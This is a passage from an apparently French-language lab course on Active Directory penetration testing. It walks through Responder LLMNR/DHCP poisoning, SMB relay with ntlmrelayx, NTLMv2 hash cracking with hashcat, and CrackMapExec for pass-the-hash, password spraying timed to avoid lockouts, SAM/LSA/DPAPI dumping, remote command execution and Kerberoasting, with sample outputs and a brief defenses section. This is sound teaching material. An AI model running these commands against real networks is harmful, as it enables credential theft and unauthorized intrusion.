grep "^SMB" /opt/Responder/Responder.conf
# Doit afficher : SMB = Off

# ─── Étape 2 : Détecter les cibles avec SMB signing désactivé ────────────────
# CME scanne le réseau et génère une liste des machines sans signature SMB
# Ces machines sont vulnérables au SMB Relay (pas de vérification d'intégrité)
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt

# ─── Étape 3 : Lancer ntlmrelayx (impacket) en écoute SMB ────────────────────
# ntlmrelayx écoute les connexions SMB et relaie les hashs vers les cibles
# -tf : target file (liste des cibles identifiées à l'étape 2)
# -smb2support : support du protocole SMB2 (moderne, pas seulement SMB1)
# -i : mode interactif (donne un shell si le relay réussit)
# -socks : maintient une session SOCKS persistant
impacket-ntlmrelayx -tf exports/smb-relay-targets.txt \
  -smb2support \
  -i \
  -socks

# Options :
#   -tf <file>           : fichier listant les cibles potentielles
#   -smb2support         : support du protocole SMB2
#   -i                   : mode interactif (shell)
#   -socks               : tunnel SOCKS persistant
#   -c <command>         : exécuter une commande à distance
#   -e <binary>          : uploader et exécuter un binaire

# ─── Étape 4 : Lancer Responder avec relay ────────────────────────────────────
# Une fois ntlmrelayx en écoute, lancez Responder (sans SMB)
# Les hashs capturés seront automatiquement relayés vers ntlmrelayx
sudo python3 /opt/Responder/Responder.py -I eth0 -v
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `sed -i 's/SMB = On/SMB = Off/' Responder.conf` | Modifie la configuration pour désactiver SMB (nécessaire pour le relay) |
| `grep "^SMB" Responder.conf` | Vérifie que la modification a bien été appliquée |
| `crackmapexec smb ... --gen-relay-list <fichier>` | Scanne le réseau et liste les machines SMB sans signature (vulnérables au relay) |
| `impacket-ntlmrelayx -tf <fichier> -smb2support -i -socks` | Ouvre un serveur de relay SMB qui relaie les authentifications vers les cibles |
| `-tf` | Target file : liste des hôtes où relayer les hashs |
| `-smb2support` | Supporte SMB2 en plus de SMB1 (nécessaire pour Windows 10/2016+) |
| `-i` | Mode interactif : ouvre un shell cmd si l'authentification réussit |
| `-socks` | Mode SOCKS : maintient un tunnel proxy réutilisable |
| `sudo python3 Responder.py -I eth0 -v` | Lance Responder (sans SMB) pour capturer et relayer les hashs |

**Utilisation de ntlmrelayx avec socks :**

```bash
# ─── Le mode socks permet de réutiliser la session relayée ───────────────────
# -socks : maintient un tunnel SOCKS pour réutiliser la session authentifiée
impacket-ntlmrelayx -tf exports/smb-relay-targets.txt -smb2support -socks

# Lorsqu'une capture est relayée, vous verrez :
# [*] SMBD-Thread-5: Connection from SDV-M2/JDOE controlled.

# Utiliser la session socks avec CrackMapExec :
# proxychains force CME à passer par le tunnel SOCKS de ntlmrelayx
# -u jdoe -H <HASH> : le hash n'est pas réellement utilisé (le tunnel relaye déjà l'auth)
proxychains crackmapexec smb 192.168.1.30 -u jdoe -H <HASH> -x whoami
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `impacket-ntlmrelayx ... -socks` | Maintient un tunnel SOCKS réutilisable pour les outils compatibles proxychains |
| `proxychains crackmapexec ...` | Force CME à passer par le tunnel SOCKS du relay (utilise l'authentification déjà relayée) |
| `-x whoami` | Execute la commande whoami sur la machine cible via le tunnel |

### 4.8 Modes avancés

#### Mode analyse (-A)

```bash
# ─── Analyse uniquement (ne répond pas, écoute juste) ─────────────────────────
# -A : passive mode, écoute le trafic LLMNR/NBT-NS sans répondre
# Utile pour cartographier les hôtes sans alerter l'équipe bleue
sudo python3 /opt/Responder/Responder.py -I eth0 -A -v
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-A` | Mode analyse passive : écoute sans empoisonner (furtif, sans risque de détection) |
| `-v` | Mode verbose : affiche toutes les requêtes réseau observées |

#### RunFinger (Fingerprint)

```bash
# ─── Outil de fingerprint des hôtes ───────────────────────────────────────────
# RunFinger.py identifie le système d'exploitation des machines sur le réseau
# -i : plage d'adresses IP à analyser (CIDR supporté)
python3 /opt/Responder/tools/RunFinger.py -i 192.168.1.0/24

# Sortie :
# [192.168.1.10] Windows Server 2022 - DC
# [192.168.1.20] Windows 10 Pro - Workstation
# [192.168.1.30] Windows Server 2019 - SQL Server
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `python3 RunFinger.py -i 192.168.1.0/24` | Lance le fingerprinting OS sur le sous-réseau 192.168.1.0/24 |
| Sortie `[...] OS` | Affiche l'adresse IP et le système d'exploitation détecté de chaque hôte |

#### DHCP Poisoning

```bash
# ─── Empoisonnement DHCP ─────────────────────────────────────────────────────
# -d : active le DHCP poisoning (l'attaquant répond aux requêtes DHCP)
# -w : active WPAD (capture via proxy automatique)
sudo python3 /opt/Responder/Responder.py -I eth0 -d -w -v

# ⚠️ Mode très agressif ! Peut causer des dénis de service.
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-d` | DHCP poisoning : l'attaquant usurpe le serveur DHCP pour rediriger le trafic |
| `-w` | Serveur WPAD : intercepte la détection de proxy automatique des navigateurs |
| `-v` | Mode verbose pour observer chaque requête |

### 4.9 TP Guidé — Capture de hash NTLMv2

#### Contexte

Vous êtes sur le même réseau local que la cible (segment 192.168.1.0/24). Vous devez capturer les hashs NTLMv2 des utilisateurs du domaine.

#### Étape 1 : Vérification de l'interface réseau

```bash
# ─── Lister les interfaces réseau ─────────────────────────────────────────────
# ip addr show affiche toutes les interfaces ; grep filtre les numéros d'interface et les IP
ip addr show | grep -E "^[0-9]|inet "
# ou
ifconfig

# ─── Vérifier que vous êtes sur le bon réseau ─────────────────────────────────
# arp-scan envoie des requêtes ARP à tout le réseau local pour découvrir les hôtes
arp-scan --localnet
# ou
# nmap -sn : ping sweep (découverte d'hôtes sans scan de ports)
nmap -sn 192.168.1.0/24
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `ip addr show \| grep -E "^[0-9]\|inet "` | Liste les interfaces réseau et leurs adresses IP (grep filtre les lignes pertinentes) |
| `ifconfig` | Alternative plus ancienne pour afficher les interfaces réseau |
| `arp-scan --localnet` | Envoie des paquets ARP à tout le sous-réseau pour découvrir les hôtes actifs |
| `nmap -sn 192.168.1.0/24` | Ping sweep Nmap : découvre les hôtes sans scanner de ports (rapide) |

#### Étape 2 : Lancement de Responder

```bash
# ─── Lancer Responder sur l'interface du réseau local ─────────────────────────
# Lance Responder avec :
# -I eth0 : interface réseau | -w : WPAD | -v : verbose (logs détaillés)
sudo python3 /opt/Responder/Responder.py -I eth0 -w -v

# ─── Ce que vous devez voir ───────────────────────────────────────────────────
# Responder affiche les serveurs qu'il démarre pour chaque protocole
[+] Starting...
[NBT-NS] Poisoning...
[LLMNR] Poisoning...
[MDNS] Poisoning...
[HTTP] Server...
[HTTPS] Server...
[WPAD] Server...
[SMB] Server...
[SQL] Server...
[FTP] Server...
[IMAP] Server...
[POP3] Server...
[LDAP] Server...
[DNS] Server...
[+] Listening for events...
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `sudo python3 /opt/Responder/Responder.py -I eth0 -w -v` | Lance Responder sur eth0 avec serveur WPAD et logs verbaux |
| `[NBT-NS] Poisoning...` | Responder écoute et empoisonne les requêtes NetBIOS Name Service |
| `[LLMNR] Poisoning...` | Responder écoute et empoisonne les requêtes LLMNR (Link-Local Multicast Name Resolution) |
| `[MDNS] Poisoning...` | Responder écoute et empoisonne les requêtes mDNS (Multicast DNS) |
| `[HTTP/HTTPS/SMB/...] Server...` | Responder démarre des faux serveurs pour chaque protocole pour capturer les hashs |
| `[+] Listening for events...` | Responder est prêt et attend les requêtes réseau |

#### Étape 3 : Simulation d'une attaque (depuis une machine Windows du lab)

Depuis une machine Windows du domaine (ex: poste utilisateur 192.168.1.20) :

```powershell
# ─── Sur la machine cible Windows ────────────────────────────────────────────
# Ces commandes simulent la faute de frappe d'un utilisateur qui tape
# un chemin UNC qui n'existe pas → déclenche LLMNR/NBT-NS

# net use tente de se connecter à un partage inexistant
# FILESERVER ne résout pas en DNS → le client envoie une requête LLMNR
net use \\FILESERVER\partage

# OU via l'explorateur : taper \\FILESERVER dans la barre d'adresse
# OU via PowerShell :
# Start-Process ouvre une fenêtre explorateur vers le chemin UNC
Start-Process explorer "\\FILESERVER"
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `net use \\FILESERVER\partage` | Tente de monter un partage SMB inexistant → déclenche une résolution LLMNR/NBT-NS |
| `Start-Process explorer "\\FILESERVER"` | Ouvre l'explorateur Windows vers un chemin UNC inexistant (déclenche aussi LLMNR) |
| Le nom `FILESERVER` n'existe pas | C'est le but : la résolution DNS échoue → LLMNR/NBT-NS est utilisé → Responder répond |

#### Étape 4 : Observation de la capture

```bash
# ─── Sur votre Kali, Responder affiche : ──────────────────────────────────────
[*] [LLMNR] Poisoned answer sent to 192.168.1.20 for name FILESERVER
[HTTP] NTLMv2 Client   : 192.168.1.20
[HTTP] NTLMv2 Username : SDV-M2\jdoe
[HTTP] NTLMv2 Hash     : jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A...

# Responder a écrit le hash dans un fichier log :
# logs/SMB-NTLMv2-192.168.1.20.txt
```

#### Étape 5 : Récupération et craquage du hash

```bash
# ─── Lister les logs capturés ─────────────────────────────────────────────────
# Vérifie la présence des logs écrits par Responder (contiennent les hashs)
ls -la /opt/Responder/logs/
# ou
ls -la /usr/share/responder/logs/

# ─── Récupérer le hash ───────────────────────────────────────────────────────
# Affiche le contenu du fichier de log pour extraire le hash NTLMv2 capturé
cat /opt/Responder/logs/SMB-NTLMv2-192.168.1.20.txt

# ─── Sauvegarder le hash dans un fichier dédié ────────────────────────────────
# Crée un dossier pour stocker les hashs collectés
mkdir -p exports/hashes
# Copie le log dans un fichier dédié pour le craquage
cp /opt/Responder/logs/SMB-NTLMv2-192.168.1.20.txt exports/hashes/responder-hash.txt

# ─── Vérifier le nombre de hashs capturés ────────────────────────────────────
# wc -l compte le nombre de lignes (un hash par ligne)
wc -l exports/hashes/responder-hash.txt

# ─── Craquage avec Hashcat et RockYou ─────────────────────────────────────────
# -m 5600 : mode NTLMv2 | --force : ignore les avertissements
# -O : optimisation (utilise des boucles déroulées pour accélérer)
# -w 3 : profil de charge (3 = haute performance, utilise plus de ressources)
hashcat -m 5600 exports/hashes/responder-hash.txt \
  /usr/share/wordlists/rockyou.txt \
  --force -O -w 3

# ─── Si le mot de passe est trouvé ────────────────────────────────────────────
# --show affiche les hashs craqués (sans relancer l'attaque)
hashcat -m 5600 --show exports/hashes/responder-hash.txt
# Sortie : jdoe::SDV-M2:...:P@ssw0rd
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `ls -la /opt/Responder/logs/` | Liste les logs de Responder (chaque fichier contient un hash NTLMv2 capturé) |
| `cat ... SMB-NTLMv2-192.168.1.20.txt` | Affiche le hash capturé depuis l'adresse IP spécifiée |
| `cp ... exports/hashes/responder-hash.txt` | Copie le hash dans un dossier centralisé pour l'organisation |
| `wc -l ...` | Compte le nombre de lignes (hashs) dans le fichier |
| `-m 5600` | Mode hashcat pour le format de hash NTLMv2 |
| `-O` | Optimisation de performance (loop unrolling) |
| `-w 3` | Workload profile 3 = haute performance (utilise plus de CPU/GPU) |
| `--show` | Affiche les mots de passe déjà craqués |

#### Étape 6 : Défenses

```bash
# ─── Vérifier si LLMNR est actif sur le réseau ───────────────────────────────
# Mode analyse (-A) : écoute passive pour observer le trafic LLMNR/NBT-NS
sudo python3 /opt/Responder/Responder.py -I eth0 -A -v

# ─── Comment les équipes bleues se protègent ──────────────────────────────────
# 1. Désactiver LLMNR via GPO
# 2. Désactiver NetBIOS via GPO
# 3. Activer SMB Signing sur tous les serveurs
# 4. Activer SMB Encryption (Windows Server 2022+)
# 5. Segmentation réseau stricte (VLANs)
# 6. Honeytokens Responder : faux chemins UNC

# ─── Contournement : même avec LLMNR désactivé ───────────────────────────────
# Responder capture toujours via :
#   - MDNS (MultiCast DNS)
#   - DHCP poisoning
#   - WPAD (proxy auto-detect)
#   - IPv6 (mitm6)
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `sudo python3 /opt/Responder/Responder.py -I eth0 -A -v` | Mode analyse passive : écoute le trafic LLMNR/NBT-NS sans répondre (détection) |
| `-A` | Analyse only : n'empoisonne pas, écoute uniquement (utile en phase de reconnaissance) |

---

## 5. CrackMapExec

### 5.1 Présentation

**CrackMapExec** (CME) est un outil post-exploitation qui permet d'énumérer et d'exploiter des environnements AD à grande échelle. Il intègre des modules pour SMB, LDAP, MSSQL, SSH, WinRM.

**Technique MITRE ATT&CK : T1049 — System Network Connections Discovery / T1087 — Account Discovery**

**Fonctionnalités principales :**
- Énumération des partages SMB (net share)
- Énumération des utilisateurs, groupes, sessions
- Énumération du système d'exploitation
- Exécution de commandes à distance (exec)
- Dump SAM / LSA secrets
- Énumération LDAP
- BloodHound integration (module bhd)
- Pass-the-Hash / Pass-the-Ticket

### 5.2 Installation

```bash
# ─── Installation via pip ─────────────────────────────────────────────────────
# Installe CrackMapExec depuis PyPI (outil post-exploitation AD multi-protocole)
pip install crackmapexec

# ─── Vérification ─────────────────────────────────────────────────────────────
# Vérifie l'installation et affiche la version
crackmapexec --version
# Sortie : CrackMapExec v6.0.0 (ou version supérieure)

# ─── Structure des dossiers ───────────────────────────────────────────────────
# Liste le dossier de configuration caché ~/.cme/
ls ~/.cme/
# cme.db       ← Base de données SQLite des résultats (hôtes, credentials, etc.)
# workspace/   ← Workspaces pour organiser les engagements
# logs/        ← Logs des exécutions
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `pip install crackmapexec` | Installe CME et ses dépendances Python |
| `crackmapexec --version` | Confirme l'installation et affiche la version |
| `ls ~/.cme/` | Liste les fichiers de configuration et la base de données locale de CME |
| `cme.db` | Base SQLite locale qui stocke tous les résultats des scans |

```bash
# ─── Installation des dépendances additionnelles ──────────────────────────────
# ldap3 : bibliothèque LDAP pure Python (nécessaire pour le module LDAP de CME)
pip install ldap3
# pymssql : connecteur MSSQL Python (nécessaire pour le module MSSQL)
pip install pymssql
# bloodhound : pour la collecte BloodHound intégrée dans CME (module bhd)
pip install bloodhound

# ─── Installation via apt (Kali) ──────────────────────────────────────────────
# Installation alternative via le gestionnaire de paquets Kali
sudo apt update && sudo apt install -y crackmapexec
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `pip install ldap3` | Dépendance pour les requêtes LDAP via CME |
| `pip install pymssql` | Dépendance pour les connexions MSSQL via CME |
| `pip install bloodhound` | Dépendance pour l'intégration BloodHound dans CME |
| `sudo apt install -y crackmapexec` | Installation via APT (version pré-packagée Kali) |

### 5.3 Syntaxe générale

```bash
# ─── Syntaxe générale de CrackMapExec ─────────────────────────────────────────
crackmapexec <protocol> <target(s)> [options]

# Protocoles disponibles :
#   smb     : SMB (partages, SAM, sessions, exécution)
#   ldap    : requêtes LDAP
#   mssql   : Microsoft SQL Server
#   ssh     : connexion SSH
#   winrm   : WinRM (Windows Remote Management)

# Cibles :
#   - Adresse IP unique : 192.168.1.10
#   - Plage CIDR : 192.168.1.0/24
#   - Fichier de cibles : target-list.txt
#   - Hostname : dc01.sdv-m2.lab
```

### 5.4 Module SMB

#### Énumération de base

```bash
# ─── 1. Énumération des hôtes SMB ─────────────────────────────────────────────
# Scan SMB de base : liste les OS et versions des machines avec SMB ouvert
crackmapexec smb 192.168.1.10

# ─── 2. Avec authentification (utilisateur + mot de passe) ────────────────────
# Teste l'authentification avec un couple identifiant/mot de passe
# Si "(admin)" apparaît, l'utilisateur a les droits administrateur sur la cible
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# ─── 3. Avec authentification (utilisateur + hash NTLM) ───────────────────────
# Pass-the-Hash : utilise le hash NT (sans mot de passe en clair)
# -H 'NTHASH:' : format LM:HASH (LM peut être vide)
crackmapexec smb 192.168.1.10 -u jdoe -H 'NTHASH:'

# ─── 4. Sur plusieurs cibles ──────────────────────────────────────────────────
# Scanne tout un sous-réseau avec les mêmes identifiants (cartographie rapide)
crackmapexec smb 192.168.1.0/24 -u jdoe -p 'P@ssw0rd'

# ─── 5. Avec liste d'utilisateurs (bruteforce / spraying) ─────────────────────
# Teste un même mot de passe contre plusieurs utilisateurs (password spraying)
crackmapexec smb 192.168.1.10 -u users.txt -p 'P@ssw0rd'

# ─── 6. Avec liste de mots de passe (spraying) ────────────────────────────────
# Teste plusieurs mots de passe pour un même utilisateur
crackmapexec smb 192.168.1.10 -u jdoe -p passwords.txt

# ─── 7. Avec liste d'utilisateurs ET de mots de passe ─────────────────────────
# Teste toutes les combinaisons utilisateurs×mots de passe
# --continue-on-success : continue même si une combinaison réussit
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --continue-on-success
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `crackmapexec smb <cible>` | Énumération de base : OS, nom NetBIOS, version SMB, statut de signature |
| `-u <user> -p <pass>` | Teste l'authentification avec mot de passe en clair |
| `-u <user> -H <hash>` | Teste l'authentification via Pass-the-Hash (hash NT uniquement) |
| `-u users.txt -p passwords.txt` | Spraying : essaie toutes les combinaisons utilisateurs × mots de passe |
| `--continue-on-success` | Continue les tests même après avoir trouvé une combinaison valide |
| `(admin)` dans la sortie | Indique que l'utilisateur a les droits administrateur sur la machine cible |

**Sortie typique :**
```
SMB         192.168.1.10   445    DC01     [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:sdv-m2.lab) (signing:True) (SMBv1:False)
SMB         192.168.1.10   445    DC01     [+] sdv-m2.lab\jdoe:P@ssw0rd (admin)
```

**Colonnes de la sortie :**
| Colonne | Description |
|---------|-------------|
| `SMB` | Protocole |
| `192.168.1.10` | Adresse IP |
| `445` | Port SMB |
| `DC01` | Nom NetBIOS de l'hôte |
| `[*]` / `[+]` / `[-]` | Statut : info / succès / échec |
| `Windows 10.0...` | OS + version (énumération) |
| `signing:True/False` | Signature SMB activée ou non |
| `SMBv1:True/False` | SMBv1 activé ou non |

L'indicateur `(admin)` signifie que l'utilisateur a les droits administrateur sur la machine distante.

#### Énumération des partages SMB

```bash
# ─── Lister les partages SMB ──────────────────────────────────────────────────
# --shares : liste tous les partages SMB disponibles avec leurs permissions
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --shares

# Sortie attendue :
# SMB         192.168.1.10   445    DC01     Share           Permissions     Remark
# SMB         192.168.1.10   445    DC01     -----           -----------     ------
# SMB         192.168.1.10   445    DC01     ADMIN$          READ            Remote Admin
# SMB         192.168.1.10   445    DC01     C$              READ,WRITE      Default share
# SMB         192.168.1.10   445    DC01     IPC$            READ            Remote IPC
# SMB         192.168.1.10   445    DC01     NETLOGON        READ            Logon server share
# SMB         192.168.1.10   445    DC01     SYSVOL          READ            Logon server share
# SMB         192.168.1.10   445    DC01     Documents       READ,WRITE      Partage des Documents

# ─── Monter SYSVOL en local pour inspection ──────────────────────────────────
# Monte le partage SYSVOL via CIFS (Common Internet File System)
# -t cifs : type de système de fichiers | -o : options (identifiants, version SMB)
sudo mount -t cifs //192.168.1.10/SYSVOL /mnt/sysvol \
  -o username=jdoe,password='P@ssw0rd',domain=sdv-m2.lab,vers=2.0

# Cherche les scripts .bat, .ps1, .vbs dans SYSVOL (sources potentielles de secrets)
find /mnt/sysvol -name "*.bat" -o -name "*.ps1" -o -name "*.vbs" 2>/dev/null
# Cherche les mots de passe ou secrets dans les scripts trouvés
grep -r -i "password\|passwd\|pwd\|secret" /mnt/sysvol/ --include="*.bat" --include="*.ps1" 2>/dev/null

# Démonte le partage SYSVOL proprement après inspection
sudo umount /mnt/sysvol
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `--shares` | Option CME pour lister les partages SMB avec leurs permissions (READ/WRITE) |
| `sudo mount -t cifs ... /mnt/sysvol` | Monte un partage SMB Windows sur le système Linux (nécessite cifs-utils) |
| `-o username=...,password=...,domain=...,vers=2.0` | Options de montage : identifiants et version SMB (2.0 pour compatibilité) |
| `find ... -name "*.bat" -o -name "*.ps1"` | Cherche les scripts de connexion qui contiennent souvent des mots de passe en clair |
| `grep -r -i "password\|secret" ...` | Recherche récursive insensible à la casse de chaînes sensibles |
| `sudo umount /mnt/sysvol` | Démonte le partage proprement |

#### Énumération des utilisateurs et groupes

```bash
# ─── Lister les utilisateurs du domaine ───────────────────────────────────────
# --users : énumère tous les utilisateurs du domaine via le DC
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users

# ─── Lister les groupes du domaine ────────────────────────────────────────────
# --groups : énumère tous les groupes du domaine
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups

# ─── Lister les sessions actives ──────────────────────────────────────────────
# --sessions : liste les sessions utilisateur actives sur la machine distante
# Utile pour identifier les utilisateurs connectés (mouvement latéral potentiel)
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sessions

# ─── Lister les admins locaux de la machine ────────────────────────────────────
# --local-auth : utilise l'authentification locale plutôt que domaine
# --users combo : liste les utilisateurs locaux de la machine
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --local-auth --users
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `--users` | Énumère les utilisateurs du domaine via SAMR ou LDAP |
| `--groups` | Énumère les groupes du domaine |
| `--sessions` | Liste les sessions utilisateur actives (mouvement latéral) |
| `--local-auth` | Force l'authentification locale (ne pas utiliser les identifiants domaine) |

#### Exécution de commandes à distance

```bash
# ─── Exécuter une commande sur la cible (via SMB exec) ────────────────────────
# -x : exécute une commande shell (cmd) à distance via SMB
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' -x whoami

# Sortie :
# SMB         192.168.1.10   445    DC01     nt authority\system

# ─── Exécuter avec des arguments complexes ────────────────────────────────────
# Les guillemets simples permettent de passer des commandes avec espaces
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' -x 'net user /domain'

# ─── Exécuter un fichier PowerShell ───────────────────────────────────────────
# -X (majuscule) : exécute une commande PowerShell (pas cmd)
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' -X 'Get-Process | Select-Object Name,CPU'

# ─── Exécuter sur plusieurs cibles ────────────────────────────────────────────
# CME accepte plusieurs adresses IP en argument pour exécution parallèle
crackmapexec smb 192.168.1.10 192.168.1.20 -u jdoe -p 'P@ssw0rd' -x ipconfig
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-x <commande>` | Exécute une commande shell Windows (cmd.exe) sur la cible distante |
| `-X <commande>` | Exécute une commande PowerShell sur la cible distante |
| Sortie `nt authority\system` | Signifie que la commande s'exécute avec les privilèges SYSTEM (le plus haut niveau) |
| Arguments multiples IP | CME peut cibler plusieurs machines en une seule commande |

#### Dump SAM

```bash
# ─── Dump du SAM (hashs locaux) ───────────────────────────────────────────────
# --sam : extraction de la base SAM (Security Account Manager) - hashs locaux
# Format sortie : username:RID:LM_HASH:NT_HASH:::
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sam

# Sortie :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::

# ─── Dump des LSA Secrets ─────────────────────────────────────────────────────
# --lsa : extraction des secrets LSA (mots de passe de service, cache domaine)
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --lsa

# ─── Dump des secrets DPAPI ────────────────────────────────────────────────────
# --dpapi : extraction des clés DPAPI (Data Protection API) - chiffrement utilisateur
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --dpapi
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `--sam` | Dump de la base SAM : hashs des comptes locaux (Administrateur, invité, services) |
| `--lsa` | Dump des LSA Secrets : secrets système (mots de passe de services, cache) |
| `--dpapi` | Dump des clés DPAPI : utilisées pour le chiffrement de données utilisateur |
| Format `RID:LM:NT` | RID=identifiant relatif, LM=hash LM (souvent vide), NT=hash NT (MD4 du mot de passe) |

#### Password Spraying

```bash
# ─── Spraying : tester un mot de passe contre plusieurs utilisateurs ──────────
# --continue-on-success : continue même si un mot de passe fonctionne
# grep '[+]' : filtre uniquement les tentatives réussies (colore en vert)
crackmapexec smb 192.168.1.10 -u exports/users.txt -p 'Spring2025!' \
  --continue-on-success | grep '[+]'

# ⚠️ Attention au lockout policy :
#   - Par défaut, 5 tentatives invalides → verrouillage (30 min)
#   - Espacer les tentatives (1 minute entre chaque)
#   - Utiliser --no-bruteforce si on teste des couples connus

# ─── Avec délai entre chaque tentative ─────────────────────────────────────────
# Boucle bash : pour chaque utilisateur, teste le mot de passe puis attend 30s
# sleep 30 : évite de déclencher le verrouillage de compte (lockout)
for user in $(cat exports/users.txt); do
  crackmapexec smb 192.168.1.10 -u "$user" -p 'Spring2025!'
  sleep 30
done

# ─── Vérifier le lockout policy ───────────────────────────────────────────────
# --pass-pol : récupère la politique de verrouillage du domaine (seuil, durée)
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --pass-pol
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `crackmapexec smb ... -u users.txt -p 'motdepasse' --continue-on-success` | Password spraying : teste un seul mot de passe contre plusieurs utilisateurs |
| `\| grep '[+]'` | Filtre les résultats pour n'afficher que les authentifications réussies |
| `for user in $(cat ...); do ... sleep 30; done` | Boucle bash avec pause de 30s entre chaque tentative pour éviter le lockout |
| `--pass-pol` | Récupère la politique de verrouillage du compte (seuil de verrouillage, durée) |

#### Génération d'une liste de relais SMB

```bash
# ─── Détection des machines sans signature SMB ────────────────────────────────
# --gen-relay-list : scanne le réseau et génère une liste des machines
# dont la signature SMB est désactivée (vulnérables au SMB Relay)
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt
cat exports/smb-relay-targets.txt
# 192.168.1.20
# 192.168.1.30
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `--gen-relay-list <fichier>` | Génère un fichier listant les hôtes avec SMB signing désactivé (cibles pour ntlmrelayx) |
| `cat <fichier>` | Affiche le contenu du fichier : une IP par ligne |

### 5.5 Module LDAP

```bash
# ─── Énumération LDAP avec CME ────────────────────────────────────────────────
# Interroge le contrôleur de domaine via LDAP pour obtenir des informations AD
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# ─── Lister tous les utilisateurs ─────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users

# ─── Lister tous les groupes ──────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups

# ─── Dump complet du domaine ──────────────────────────────────────────────────
# --dump : exporte tous les objets AD (utilisateurs, groupes, ordinateurs, OU)
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --dump

# ─── Comptes AS-REP Roastable ─────────────────────────────────────────────────
# --asreproast : identifie les comptes sans pré-auth Kerberos et exporte les hashs
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --asreproast exports/asrep-hashes.txt

# ─── Comptes Kerberoastable ──────────────────────────────────────────────────
# --kerberoast : identifie les comptes avec SPN et exporte les TGS hashs
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --kerberoast exports/kerberoast-hashes.txt

# ─── Comptes administrés (adminCount=1) ───────────────────────────────────────
# --admin-count : liste les utilisateurs membres de groupes protégés (DA, EA, etc.)
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --admin-count

# ─── Relation de confiance ────────────────────────────────────────────────────
# --trusted-for-delegation : identifie les comptes avec délégation Kerberos
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --trusted-for-delegation
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `crackmapexec ldap <DC>` | Ouvre une connexion LDAP au contrôleur de domaine |
| `--users` | Énumère tous les utilisateurs du domaine via LDAP |
| `--groups` | Énumère tous les groupes du domaine via LDAP |
| `--dump` | Exporte l'intégralité des objets AD (équivalent à ldapdomaindump) |
| `--asreproast <fichier>` | Extrait les hashs AS-REP (mode 18200 pour hashcat) |
| `--kerberoast <fichier>` | Extrait les hashs TGS (mode 13100 pour hashcat) |
| `--admin-count` | Identifie les comptes privilégiés (adminCount=1) |
| `--trusted-for-delegation` | Identifie les comptes avec délégation Kerberos configurée |

### 5.6 Module MSSQL

```bash
# ─── Énumération des serveurs MSSQL ───────────────────────────────────────────
# Teste l'accès à un serveur Microsoft SQL avec les identifiants du domaine
crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd'

# ─── Exécution de requêtes SQL ────────────────────────────────────────────────
# -q : exécute une requête SQL sur le serveur MSSQL distant
crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd' -q 'SELECT @@version'

# ─── Exécution de commandes OS via xp_cmdshell ─────────────────────────────────
# -x : exécute une commande OS via xp_cmdshell (nécessite que xp_cmdshell soit activé)
crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd' -x whoami

# ─── Activer xp_cmdshell (si désactivé) ───────────────────────────────────────
# --enable-xp-cmdshell : active la procédure stockée xp_cmdshell (exécution de commandes)
